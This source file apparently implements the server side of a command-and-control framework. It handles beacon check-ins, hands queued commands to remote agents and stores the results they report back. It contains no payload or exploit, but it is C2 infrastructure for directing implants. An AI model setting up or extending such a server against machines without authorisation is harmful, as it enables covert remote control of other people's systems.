import { createClientFromRequest } from 'npm:@base44/sdk@0.8.6';

Deno.serve(async (req) => {
  try {
    if (req.method === 'OPTIONS') {
      return new Response(null, { status: 200 });
    }

    const api = createClientFromRequest(req);
    const user = await api.auth.me();

    if (!user) {
      return Response.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const url = new URL(req.url);
    const endpoint = url.pathname;
    const searchParams = url.searchParams;

    // Agent beacon check-in
    if (req.method === 'GET' && endpoint.includes('/api/check')) {
      const agentId = searchParams.get('agent_id');
      const beaconId = searchParams.get('beacon_id');

      if (!beaconId || !agentId) {
        return Response.json({ error: 'Missing beacon_id or agent_id' }, { status: 400 });
      }

      // Fetch beacon
      const beacons = await api.entities.Beacon.filter({ beacon_id: beaconId });
      if (!beacons || beacons.length === 0) {
        return Response.json({ error: 'Beacon not found' }, { status: 404 });
      }

      const beacon = beacons[0];

      // Update last callback
      await api.entities.Beacon.update(beacon.id, {
        last_callback: new Date().toISOString(),
        callback_count: (beacon.callback_count || 0) + 1,
        status: 'active'
      });

      // Fetch pending commands
      const commands = await api.entities.Command.filter({
        beacon_id: beaconId,
        status: 'queued'
      });

      // Mark commands as sent
      for (const cmd of commands) {
        await api.entities.Command.update(cmd.id, {
          status: 'sent',
          executed_at: new Date().toISOString()
        });
      }

      // Return commands to beacon
      return Response.json({
        status: 'ok',
        commands: commands.map(c => ({
          id: c.id,
          type: c.command_type,
          command: c.command,
          args: c.arguments
        }))
      });
    }

    // Agent result submission
    if (req.method === 'POST' && endpoint.includes('/api/result')) {
      const body = await req.json();
      const { beacon_id, command_id, output, error, status, execution_time_ms } = body;

      if (!beacon_id || !command_id) {
        return Response.json({ error: 'Missing beacon_id or command_id' }, { status: 400 });
      }

      // Store command result
      await api.entities.CommandResult.create({
        command_id,
        beacon_id,
        c2_server_id: body.c2_server_id,
        output: output || '',
        error: error || null,
        status: status || 'success',
        execution_time_ms: execution_time_ms || 0,
        received_at: new Date().toISOString(),
        size_bytes: (output || '').length
      });

      // Update command status
      await api.entities.Command.update(command_id, {
        status: status === 'failed' ? 'failed' : 'executed'
      });

      return Response.json({ status: 'received' });
    }

    return Response.json({ error: 'Invalid endpoint' }, { status: 400 });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});